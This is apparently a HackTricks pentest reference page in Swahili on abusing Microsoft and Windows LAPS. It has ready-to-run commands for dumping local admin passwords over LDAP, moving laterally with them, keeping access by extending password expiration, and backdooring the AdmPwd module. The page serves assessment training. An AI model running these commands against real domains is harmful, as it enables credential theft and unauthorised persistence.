# LAPS

{{#include ../../banners/hacktricks-training.md}}


## Maelezo ya Msingi

Kwa sasa kuna **aina 2 za LAPS** unazoweza kukutana nazo wakati wa assessment:

- **Legacy Microsoft LAPS**: huhifadhi password ya local administrator katika **`ms-Mcs-AdmPwd`** na muda wa kuisha kwake katika **`ms-Mcs-AdmPwdExpirationTime`**.
- **Windows LAPS** (iliyojengwa ndani ya Windows tangu updates za Aprili 2023): bado inaweza kuiga legacy mode, lakini katika native mode hutumia attributes za **`msLAPS-*`**, inaunga mkono **password encryption**, **password history**, na **DSRM password backup** kwa domain controllers.

LAPS imeundwa kusimamia **passwords za local administrator**, na kuzifanya ziwe **unique, randomized, na zibadilishwe mara kwa mara** kwenye computers zilizojiunga na domain. Ikiwa unaweza kusoma attributes hizo, kwa kawaida unaweza **kupivot kama local admin** kwenda kwenye host iliyoathirika. Katika environments nyingi, sehemu ya kuvutia si kusoma password yenyewe pekee, bali pia kujua **ni nani aliyepewa delegated access** kwa password attributes.

### Legacy Microsoft LAPS attributes

Katika computer objects za domain, utekelezaji wa Legacy Microsoft LAPS husababisha kuongezwa kwa attributes mbili:<sup>[[1]](#references)</sup>

- **`ms-Mcs-AdmPwd`**: **password ya administrator katika plain-text**
- **`ms-Mcs-AdmPwdExpirationTime`**: **muda wa kuisha wa password**

### Windows LAPS attributes

Native Windows LAPS huongeza attributes kadhaa mpya kwenye computer objects:<sup>[[2]](#references)</sup>

- **`msLAPS-Password`**: blob ya password ya clear-text iliyohifadhiwa kama JSON wakati encryption haijawezeshwa
- **`msLAPS-PasswordExpirationTime`**: muda uliopangwa wa kuisha
- **`msLAPS-EncryptedPassword`**: password ya sasa iliyosimbwa kwa njia fiche
- **`msLAPS-EncryptedPasswordHistory`**: history ya passwords iliyosimbwa kwa njia fiche
- **`msLAPS-EncryptedDSRMPassword`** / **`msLAPS-EncryptedDSRMPasswordHistory`**: data ya DSRM password ya domain controllers iliyosimbwa kwa njia fiche
- **`msLAPS-CurrentPasswordVersion`**: ufuatiliaji wa version unaotumia GUID, unaotumiwa na logic mpya zaidi ya kugundua rollback (Windows Server 2025 forest schema)

Wakati **`msLAPS-Password`** inaweza kusomeka, value huwa ni JSON object iliyo na jina la account, muda wa update na password ya clear-text, kwa mfano:<sup>[[2]](#references)</sup>
```json
{"n":"Administrator","t":"1d8161b41c41cde","p":"A6a3#7%..."}
```
### Angalia kama imewashwa
```bash
# Legacy Microsoft LAPS policy
reg query "HKLM\Software\Policies\Microsoft Services\AdmPwd" /v AdmPwdEnabled

dir "C:\Program Files\LAPS\CSE"
# Check if that folder exists and contains AdmPwd.dll

# Native Windows LAPS binaries / PowerShell module
Get-Command *Laps*
dir "$env:windir\System32\LAPS"

# Find GPOs that have "LAPS" or some other descriptive term in the name
Get-DomainGPO | ? { $_.DisplayName -like "*laps*" } | select DisplayName, Name, GPCFileSysPath | fl

# Legacy Microsoft LAPS-enabled computers (any Domain User can usually read the expiration attribute)
Get-DomainObject -SearchBase "LDAP://DC=sub,DC=domain,DC=local" |
? { $_."ms-mcs-admpwdexpirationtime" -ne $null } |
select DnsHostname

# Native Windows LAPS-enabled computers
Get-DomainObject -LDAPFilter '(|(msLAPS-PasswordExpirationTime=*)(msLAPS-EncryptedPassword=*)(msLAPS-Password=*))' |
select DnsHostname
```
## Ufikiaji wa Nenosiri la LAPS

Unaweza **kupakua raw LAPS policy** kutoka `\\dc\SysVol\domain\Policies\{4A8A4E8E-929F-401A-95BD-A7D40E0976C8}\Machine\Registry.pol` kisha utumie **`Parse-PolFile`** kutoka kwenye kifurushi cha [**GPRegistryPolicyParser**](https://github.com/PowerShell/GPRegistryPolicyParser) kubadilisha faili hili kuwa muundo unaoweza kusomeka na binadamu.

### Legacy Microsoft LAPS PowerShell cmdlets

Ikiwa module ya legacy LAPS imesakinishwa, cmdlets zifuatazo kwa kawaida hupatikana:
```bash
Get-Command *AdmPwd*

CommandType     Name                                               Version    Source
-----------     ----                                               -------    ------
Cmdlet          Find-AdmPwdExtendedRights                          5.0.0.0    AdmPwd.PS
Cmdlet          Get-AdmPwdPassword                                 5.0.0.0    AdmPwd.PS
Cmdlet          Reset-AdmPwdPassword                               5.0.0.0    AdmPwd.PS
Cmdlet          Set-AdmPwdAuditing                                 5.0.0.0    AdmPwd.PS
Cmdlet          Set-AdmPwdComputerSelfPermission                   5.0.0.0    AdmPwd.PS
Cmdlet          Set-AdmPwdReadPasswordPermission                   5.0.0.0    AdmPwd.PS
Cmdlet          Set-AdmPwdResetPasswordPermission                  5.0.0.0    AdmPwd.PS
Cmdlet          Update-AdmPwdADSchema                              5.0.0.0    AdmPwd.PS

# List who can read the LAPS password of the given OU
Find-AdmPwdExtendedRights -Identity Workstations | fl

# Read the password
Get-AdmPwdPassword -ComputerName wkstn-2 | fl
```
### cmdlets za PowerShell za Windows LAPS

Native Windows LAPS huja na module mpya ya PowerShell na cmdlets mpya:
```bash
Get-Command *Laps*

# Discover who has extended rights over the OU
Find-LapsADExtendedRights -Identity Workstations

# Read a password from AD
Get-LapsADPassword -Identity wkstn-2 -AsPlainText

# Include password history if encryption/history is enabled
Get-LapsADPassword -Identity wkstn-2 -AsPlainText -IncludeHistory

# Query DSRM password from a DC object
Get-LapsADPassword -Identity dc01.contoso.local -AsPlainText

# Use alternate credentials for an authorized decryptor
$cred = Get-Credential CONTOSO\LAPSDecryptor
Get-LapsADPassword -Identity wkstn-2 -AsPlainText -DecryptionCredential $cred
```
Mambo machache ya kiutendaji ni muhimu hapa:<sup>[[3]](#references)</sup>

- **`Get-LapsADPassword`** hushughulikia kiotomatiki **legacy LAPS**, **clear-text Windows LAPS**, na **encrypted Windows LAPS**.
- Ikiwa password imesimbwa kwa njia fiche na unaweza **kuisoma** lakini huwezi **kuifungua**, cmdlet hurejesha metadata kama vile **`Source`**, **`DecryptionStatus`**, na **`AuthorizedDecryptor`** hata ikiwa haiwezi kurejesha password ya clear-text.
- Katika **encrypted Windows LAPS**, **read permission** na **decrypt permission** ni **controls** tofauti. Kuwa na OU / object read access hakumaanishi kiotomatiki kwamba unaweza kufungua **`msLAPS-EncryptedPassword`**.
- **Password history** hupatikana tu wakati **Windows LAPS encryption** imewezeshwa.
- Kwenye domain controllers, source inayorejeshwa inaweza kuwa **`EncryptedDSRMPassword`**.

Hii ni muhimu wakati wa assessment kwa sababu field ya **`AuthorizedDecryptor`** hukuonyesha **ni user au group gani blob ilisimbwa kwa ajili yake**, na mara nyingi hubadilisha password read iliyoshindikana kuwa target mpya ya privilege-escalation.

### PowerView / LDAP

**PowerView** inaweza pia kutumika kubaini **ni nani anayeweza kusoma password na kuisoma**:
```bash
# Legacy Microsoft LAPS: find principals with rights over the OU
Find-AdmPwdExtendedRights -Identity Workstations | fl

# Legacy Microsoft LAPS: read the password directly from LDAP
Get-DomainObject -Identity wkstn-2 -Properties ms-Mcs-AdmPwd,ms-Mcs-AdmPwdExpirationTime

# Native Windows LAPS clear-text mode
Get-DomainObject -Identity wkstn-2 -Properties msLAPS-Password,msLAPS-PasswordExpirationTime
```
Ikiwa **`msLAPS-Password`** inaweza kusomeka, parse JSON iliyorejeshwa na utoe **`p`** kwa ajili ya password na **`n`** kwa ajili ya jina la akaunti ya local admin inayosimamiwa.
```bash
# Extract both the password and the real managed account name
$laps = (Get-DomainObject -Identity wkstn-2 -Properties msLAPS-Password)."msLAPS-Password" | ConvertFrom-Json
$laps.n
$laps.p
```
Sehemu ya **`n`** ni muhimu kwenye deployments mpya kwa sababu **Windows LAPS automatic account management** inaweza kulenga **custom account** badala ya **`Administrator`** iliyojengwa ndani, na mifumo mipya ya **Windows 11 24H2 / Windows Server 2025** inaweza hata **randomize** jina la account hiyo.<sup>[[4]](#references)</sup>

### Linux / zana za mbali

Zana za kisasa zinaunga mkono Microsoft LAPS ya zamani pamoja na Windows LAPS.
```bash
# NetExec / CrackMapExec lineage: dump LAPS values over LDAP
nxc ldap 10.10.10.10 -u user -p password -M laps

# Filter to a subset of computers
nxc ldap 10.10.10.10 -u user -p password -M laps -o COMPUTER='WKSTN-*'

# Use read LAPS access to authenticate to hosts at scale
nxc smb 10.10.10.0/24 -u user-can-read-laps -p 'Passw0rd!' --laps

# If the local admin name is not Administrator
nxc smb 10.10.10.0/24 -u user-can-read-laps -p 'Passw0rd!' --laps customadmin

# Legacy Microsoft LAPS with bloodyAD
bloodyAD --host 10.10.10.10 -d contoso.local -u user -p 'Passw0rd!' \
get search --filter '(ms-mcs-admpwdexpirationtime=*)' \
--attr ms-mcs-admpwd,ms-mcs-admpwdexpirationtime
```
Notes:

- Builds za hivi karibuni za **NetExec** zinaunga mkono **`ms-Mcs-AdmPwd`**, **`msLAPS-Password`**, na **`msLAPS-EncryptedPassword`**.
- **`pyLAPS`** bado ni muhimu kwa **Microsoft LAPS ya legacy** kutoka Linux, lakini inalenga **`ms-Mcs-AdmPwd`** pekee.
- Zana mpya za cross-platform kama **`LAPS4LINUX`**, zana zinazotegemea **`dpapi-ng`**, na workflows za hivi karibuni za **NetExec** pia zinaweza kushughulikia **native Windows LAPS** kutoka hosts zisizo za Windows.
- Ikiwa environment inatumia **Windows LAPS iliyosimbwa**, LDAP read rahisi haitoshi; pia unahitaji kuwa **authorized decryptor** (au kuwa na decryption material inayolingana, kama offline domain DPAPI-NG root key material).<sup>[[5]](#references)</sup>
- Kwenye **Windows 11 24H2 / Windows Server 2025**, usidhani kuwa managed local admin daima ni **`Administrator`**. Automatic account management inaweza kuunda account maalum na, kwa hiari, kubadilisha jina lake bila mpangilio; kwa hiyo gundua jina la account kwanza kupitia **`n`** / **`Account`** kabla ya kutumia **`--laps`** kwa kiwango kikubwa.<sup>[[4]](#references)</sup>

### Abuse ya directory synchronization

Ikiwa una rights za kiwango cha domain za **directory synchronization** badala ya direct read access kwenye kila computer object, LAPS bado inaweza kuwa muhimu.

Mchanganyiko wa **`DS-Replication-Get-Changes`** pamoja na **`DS-Replication-Get-Changes-In-Filtered-Set`** au **`DS-Replication-Get-Changes-All`** unaweza kutumika kusynchronize attributes za **confidential / RODC-filtered** kama vile legacy **`ms-Mcs-AdmPwd`**. BloodHound ina-model hii kama **`SyncLAPSPassword`**. Angalia [DCSync](dcsync.md) kwa background kuhusu replication rights.

## LAPSToolkit

[LAPSToolkit](https://github.com/leoloobeek/LAPSToolkit) inawezesha enumeration ya LAPS kwa kutumia functions kadhaa.<sup>[[6]](#references)</sup>\
Moja wapo ni kuparse **`ExtendedRights`** kwa **computers zote zilizo na LAPS enabled.** Hii inaonyesha **groups** ambazo **zimepewa delegation maalum ya kusoma LAPS passwords**, ambazo mara nyingi huwa users walio kwenye protected groups.\
**Account** ambayo **imejiunga na computer** kwenye domain hupokea `All Extended Rights` juu ya host hiyo, na right hii huipa **account** uwezo wa **kusoma passwords**. Enumeration inaweza kuonyesha user account inayoweza kusoma LAPS password kwenye host. Hii inaweza kutusaidia **kulenga AD users maalum** ambao wanaweza kusoma LAPS passwords.
```bash
# Get groups that can read passwords
Find-LAPSDelegatedGroups

OrgUnit                                           Delegated Groups
-------                                           ----------------
OU=Servers,DC=DOMAIN_NAME,DC=LOCAL                DOMAIN_NAME\Domain Admins
OU=Workstations,DC=DOMAIN_NAME,DC=LOCAL           DOMAIN_NAME\LAPS Admin

# Checks the rights on each computer with LAPS enabled for any groups
# with read access and users with "All Extended Rights"
Find-AdmPwdExtendedRights
ComputerName                Identity                    Reason
------------                --------                    ------
MSQL01.DOMAIN_NAME.LOCAL    DOMAIN_NAME\Domain Admins   Delegated
MSQL01.DOMAIN_NAME.LOCAL    DOMAIN_NAME\LAPS Admins     Delegated

# Get computers with LAPS enabled, expiration time and the password (if you have access)
Get-LAPSComputers
ComputerName                Password       Expiration
------------                --------       ----------
DC01.DOMAIN_NAME.LOCAL      j&gR+A(s976Rf% 12/10/2022 13:24:41
```
## Kudump LAPS Passwords Kwa Kutumia NetExec / CrackMapExec

Ikiwa huna interactive PowerShell, unaweza kutumia vibaya privilege hii remotely kupitia LDAP:
```bash
# Legacy syntax still widely seen in writeups
crackmapexec ldap 10.10.10.10 -u user -p password --kdcHost 10.10.10.10 -M laps

# Current project name / syntax
nxc ldap 10.10.10.10 -u user -p password -M laps
```
Hii inatoa secrets zote za LAPS ambazo user anaweza kusoma, na kukuwezesha kufanya move laterally kwa kutumia local administrator password tofauti.

## Kutumia LAPS Password
```bash
xfreerdp /v:192.168.1.1:3389 /u:Administrator
Password: 2Z@Ae)7!{9#Cq

python psexec.py Administrator@web.example.com
Password: 2Z@Ae)7!{9#Cq
```
## LAPS Persistence

### Tarehe ya Kuisha

Mara tu unapokuwa admin, inawezekana **kupata nywila** na **kuzuia** mashine **kusasisha** **nywila** yake kwa **kuweka tarehe ya kuisha katika siku zijazo**.

Legacy Microsoft LAPS:
```bash
# Get expiration time
Get-DomainObject -Identity computer-21 -Properties ms-mcs-admpwdexpirationtime

# Change expiration time
## SYSTEM on the computer is needed
Set-DomainObject -Identity wkstn-2 -Set @{"ms-mcs-admpwdexpirationtime"="232609935231523081"}
```
Native Windows LAPS hutumia **`msLAPS-PasswordExpirationTime`** badala yake:
```bash
# Read the current expiration timestamp
Get-DomainObject -Identity wkstn-2 -Properties msLAPS-PasswordExpirationTime

# Push the expiration into the future
Set-DomainObject -Identity wkstn-2 -Set @{"msLAPS-PasswordExpirationTime"="133801632000000000"}
```
> [!WARNING]
> Nenosiri bado litabadilishwa ikiwa **admin** atatumia **`Reset-AdmPwdPassword`** / **`Reset-LapsPassword`**, au ikiwa **Do not allow password expiration time longer than required by policy** imewezeshwa.

### Tahadhari kuhusu snapshot rollback kwenye Windows LAPS mpya zaidi

Mbinu za zamani za snapshot / image rollback **hazitegemewi sana** dhidi ya deployments za hivi karibuni za **Windows LAPS**. Kwenye **Windows 11 24H2 / Windows Server 2025**, ikiwa forest schema inajumuisha **`msLAPS-CurrentPasswordVersion`** (**Windows Server 2025 forest schema**), client hulinganisha GUID iliyohifadhiwa locally na thamani iliyohifadhiwa kwenye AD na **hubadilisha nenosiri mara moja** rollback inapotengeneza **torn state**.

Kwa vitendo, hii inamaanisha kwamba persistence inayotegemea snapshot au majaribio ya kufufua nenosiri la zamani linalojulikana la local admin inaweza kuharibika haraka badala ya kudumu hadi muda wa kawaida wa expiration.<sup>[[2]](#references)</sup>

Ulinzi huu unatumika tu kwa **AD-backed Windows LAPS** na bado unategemea mashine iliyorejeshwa kuweza **kuthibitisha utambulisho wake dhidi ya AD**. Ikiwa mashine haiwezi tena kuwasiliana na AD, **historia ya manenosiri** au **ufikiaji wa chelezo ya AD** bado vinaweza kusaidia.

### Tahadhari kuhusu automatic account management tampering

Wakati **automatic account management** imewezeshwa, Windows LAPS inasimamia lifecycle ya managed local admin account. Majaribio yasiyotarajiwa ya kubadilisha jina, kureconfigure, au kufanya tamper nyingine kwenye account hiyo yanaweza kukataliwa kwa **`STATUS_POLICY_CONTROLLED_ACCOUNT`** / **`ERROR_POLICY_CONTROLLED_ACCOUNT`**, hivyo persistence inayotegemea kurekebisha kwa siri LAPS account inayosimamiwa haiaminiki sana kwenye endpoints mpya zaidi.<sup>[[4]](#references)</sup>

### Kurejesha manenosiri ya zamani kutoka kwa chelezo za AD

Wakati **Windows LAPS encryption + password history** imewezeshwa, chelezo za AD zilizomountiwa zinaweza kuwa chanzo cha ziada cha secrets. Ikiwa unaweza kufikia AD snapshot iliyomountiwa na kutumia **recovery mode**, unaweza kuuliza manenosiri ya zamani yaliyohifadhiwa bila kuwasiliana na DC hai.<sup>[[3]](#references)</sup>
```bash
# Query a mounted AD snapshot on port 50000
Get-LapsADPassword -Identity wkstn-2 -AsPlainText -Port 50000 -RecoveryMode

# Historical entries if history is enabled
Get-LapsADPassword -Identity wkstn-2 -AsPlainText -IncludeHistory -Port 50000 -RecoveryMode
```
Hili lina umuhimu hasa wakati wa **AD backup theft**, **offline forensics abuse**, au **disaster-recovery media access**.

### Backdoor

Msimbo wa awali wa Microsoft LAPS ya zamani unaweza kupatikana [hapa](https://github.com/GreyCorbel/admpwd), hivyo inawezekana kuweka backdoor kwenye msimbo (kwa mfano ndani ya method ya `Get-AdmPwdPassword` katika `Main/AdmPwd.PS/Main.cs`) ambayo kwa namna fulani **itafanya exfiltrate ya passwords mpya au kuzihifadhi mahali fulani**.

Kisha, compile `AdmPwd.PS.dll` mpya na uipakie kwenye mashine katika `C:\Tools\admpwd\Main\AdmPwd.PS\bin\Debug\AdmPwd.PS.dll` (na ubadilishe modification time).

## Marejeo

- [1] [Utangulizi wa Microsoft LAPS – Local Administrator Password Solution](https://4sysops.com/archives/introduction-to-microsoft-laps-local-administrator-password-solution/)
- [2] [Schema ya Windows LAPS na upanuzi wa rights kwa Windows Server Active Directory](https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-technical-reference)
- [3] [Anza kutumia Windows LAPS na Windows Server Active Directory](https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-scenarios-windows-server-active-directory)
- [4] [Njia za usimamizi wa account za Windows LAPS](https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-concepts-account-management-modes)
- [5] [LAPS 2.0 Internals - XPN Infosec Blog](https://blog.xpnsec.com/lapsv2-internals/)
- [6] [LAPSToolkit - leoloobeek](https://github.com/leoloobeek/LAPSToolkit)

{{#include ../../banners/hacktricks-training.md}}
